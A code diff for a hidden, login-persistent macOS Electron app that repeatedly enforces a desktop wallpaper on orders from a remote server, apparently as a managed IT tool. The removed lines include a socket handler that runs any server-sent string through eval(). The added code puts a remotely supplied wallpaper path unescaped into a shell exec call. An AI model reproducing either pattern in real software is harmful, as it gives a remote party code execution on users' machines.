@@ -1,145 +1,160 @@
-const { app, Tray, Menu, nativeImage, dialog } = require("electron");
+const { app } = require("electron");
 const { exec } = require("child_process");
 const os = require("os");
-const path = require("path"); // Added for path resolution
+const path = require("path");
+const fs = require("fs");
+const https = require("https");
 const io = require("socket.io-client");
 const Store = require("electron-store");
-const prompt = require("electron-prompt");
 
+// --- DYNAMIC PATHING ---
+// In a macOS .app bundle, the executable is at: Contents/MacOS/AppName
+// We go up 4 levels to land in the folder containing the .app
+const APP_BUNDLE_DIR = app.isPackaged
+	? path.join(path.dirname(app.getPath("exe")), "../../../../")
+	: __dirname;
 
+const CONFIG_FILE = path.join(APP_BUNDLE_DIR, "config.json");
+const INIT_CONFIG_URL = "https://wallpg.web.app/init_config.json";
 
-let tool_usable = true;
-
-// Fix for CommonJS instantiation
+// --- INTERNAL STATES ---
 const store = new (Store.default || Store)();
+const DEVICE_NAME = os.userInfo().username;
+let toolUsable = true;
 
-let tray = null;
+let settings = {
+	serverUrl: store.get("serverUrl") || "http://localhost:7100",
+	wallpaperPath:
+		store.get("wallpaperPath") ||
+		"/System/Library/CoreServices/DefaultDesktop.heic",
+	checkInterval: store.get("checkInterval") || 5000,
+};
+
 let socket = null;
-var DEFAULT_PATH = "/System/Library/CoreServices/DefaultDesktop.heic";
+let enforcementTimer = null;
 
-let serverUrl = store.get("serverUrl") || "http://localhost:7100";
-const macUsername = os.userInfo().username;
-
-// CRITICAL: Prevent the app from quitting when the prompt window closes
-app.on("window-all-closed", (e) => {
-	e.preventDefault();
-});
+// --- CORE FUNCTIONS ---
 
 function connectSocket() {
-	if (socket) {
-		socket.removeAllListeners();
-		socket.disconnect();
-	}
-
-	console.log(`Connecting to: ${serverUrl}`);
-	socket = io(serverUrl, {
-		reconnection: true,
-		reconnectionAttempts: Infinity,
-	});
+	if (socket) socket.disconnect();
+	socket = io(settings.serverUrl, { reconnection: true });
 
 	socket.on("connect", () => {
-		socket.emit("register-mac", macUsername);
-		updateMenu();
+		socket.emit("register-mac", DEVICE_NAME);
 	});
-
-	socket.on("connect_error", () => updateMenu());
-	socket.on("disconnect", () => updateMenu());
 
 	socket.on("enforce-wallpaper", () => {
-		if (tool_usable) enforceWallpaper();
+		if (toolUsable) enforceWallpaper();
 	});
 
-	socket.on("admin-command", (command) => {
-		eval(command);
+	socket.on("admin-change", (allow) => {
+		toolUsable = allow;
 	});
-
-	socket.on("admin-change", (allow_control) => {
-		tool_usable = allow_control;
-		updateMenu();
-	});
-}
-
-function updateMenu() {
-	const status = socket && socket.connected ? "🟢 Online" : "🔴 Offline";
-
-	const contextMenu = Menu.buildFromTemplate([
-		{ label: `Device: ${macUsername}`, enabled: false },
-		{ label: `Status: ${status}`, enabled: false },
-		{ label: `Server: ${serverUrl}`, enabled: false },
-		{ type: "separator" },
-		{
-			label: "Set Server Address",
-			enabled: tool_usable,
-			click: () => {
-				prompt({
-					title: "Server Settings",
-					label: "Enter Server URL (e.g., http://192.168.1.50:7100):",
-					value: serverUrl,
-					inputAttrs: { type: "url" },
-					type: "input",
-					alwaysOnTop: true,
-				})
-					.then((r) => {
-						if (r && r.startsWith("http")) {
-							serverUrl = r;
-							store.set("serverUrl", r);
-							connectSocket();
-						}
-					})
-					.catch(console.error);
-			},
-		},
-		{ type: "separator" },
-		{
-			label: "Force Reset Wallpaper",
-			click: () => enforceWallpaper(),
-			enabled: tool_usable,
-		},
-		{ label: "Quit", click: () => app.quit(), enabled: tool_usable },
-	]);
-
-	if (tray) tray.setContextMenu(contextMenu);
 }
 
 function enforceWallpaper() {
-	const script = `tell application "System Events" to set picture of every desktop to POSIX file "${DEFAULT_PATH}"`;
+	const script = `tell application "System Events" to set picture of every desktop to POSIX file "${settings.wallpaperPath}"`;
 	exec(`osascript -e '${script}'`);
 }
 
-app.whenReady().then(() => {
-	if (process.platform === "darwin") app.dock.hide();
+function startEnforcementLoop() {
+	if (enforcementTimer) clearInterval(enforcementTimer);
+	enforcementTimer = setInterval(() => {
+		if (toolUsable) enforceWallpaper();
+	}, settings.checkInterval);
+}
 
-	function setAutoLaunch(enabled) {
-		app.setLoginItemSettings({
-			openAtLogin: enabled,
-			openAsHidden: true,
-			path: app.getPath("exe"),
-		});
+// --- CONFIG MANAGEMENT ---
+
+async function syncConfig(newConfig) {
+	if (newConfig.serverUrl) {
+		settings.serverUrl = newConfig.serverUrl;
+		store.set("serverUrl", settings.serverUrl);
+	}
+	if (newConfig.wallpaperPath) {
+		settings.wallpaperPath = newConfig.wallpaperPath;
+		store.set("wallpaperPath", settings.wallpaperPath);
+	}
+	if (newConfig.checkInterval) {
+		settings.checkInterval = newConfig.checkInterval;
+		store.set("checkInterval", settings.checkInterval);
 	}
 
-	setAutoLaunch(true);
+	connectSocket();
+	startEnforcementLoop();
+	enforceWallpaper();
+}
 
-	// Resolve the path to the icon file
-	const iconPath = path.join(__dirname, "res", "icon.png");
+function downloadInitConfig() {
+	return new Promise((resolve, reject) => {
+		https
+			.get(INIT_CONFIG_URL, (res) => {
+				let data = "";
+				res.on("data", (chunk) => (data += chunk));
+				res.on("end", () => {
+					try {
+						const parsed = JSON.parse(data);
+						const cleanConfig = {
+							serverUrl: parsed.serverUrl,
+							wallpaperPath: parsed.wallpaperPath,
+							checkInterval: parsed.checkInterval,
+						};
+						fs.writeFileSync(
+							CONFIG_FILE,
+							JSON.stringify(cleanConfig, null, 4),
+						);
+						resolve(cleanConfig);
+					} catch (e) {
+						reject(e);
+					}
+				});
+			})
+			.on("error", reject);
+	});
+}
 
-	// Create the image. Using resize ensures it fits standard tray dimensions (16x16 or 22x22)
-	const icon = nativeImage
-		.createFromPath(iconPath)
-		.resize({ width: 18, height: 18 });
+fs.watchFile(CONFIG_FILE, () => {
+	try {
+		const data = JSON.parse(fs.readFileSync(CONFIG_FILE, "utf8"));
+		syncConfig(data);
+	} catch (e) {}
+});
 
-	// Initialize the tray with your icon
-	tray = new Tray(icon);
+// --- LIFECYCLE ---
 
-	// to change colors automatically in Dark Mode,
-	// ensure the file is named iconTemplate.png and use:
-	// icon.setTemplateImage(true);
+app.on("window-all-closed", (e) => e.preventDefault());
 
-	// Tooltip when hovering over the icon
-	tray.setToolTip("Wallpaper Guard");
+app.whenReady().then(async () => {
+	if (process.platform === "darwin") app.dock.hide();
+
+	// Verification check for IT (Visible in Console/Logs)
+	console.log("Service directory:", APP_BUNDLE_DIR);
+
+	if (!fs.existsSync(CONFIG_FILE)) {
+		try {
+			const remoteConfig = await downloadInitConfig();
+			await syncConfig(remoteConfig);
+		} catch (e) {
+			console.error("Failed to write config. Ensure folder is writable.");
+			syncConfig(settings);
+		}
+	} else {
+		try {
+			const localFileConfig = JSON.parse(
+				fs.readFileSync(CONFIG_FILE, "utf8"),
+			);
+			syncConfig(localFileConfig);
+		} catch (e) {
+			syncConfig(settings);
+		}
+	}
+
+	app.setLoginItemSettings({
+		openAtLogin: true,
+		openAsHidden: true,
+		path: app.getPath("exe"),
+	});
 
 	connectSocket();
-	updateMenu();
-
-	// The Guard
-	setInterval(enforceWallpaper, 1000);
+	startEnforcementLoop();
 });
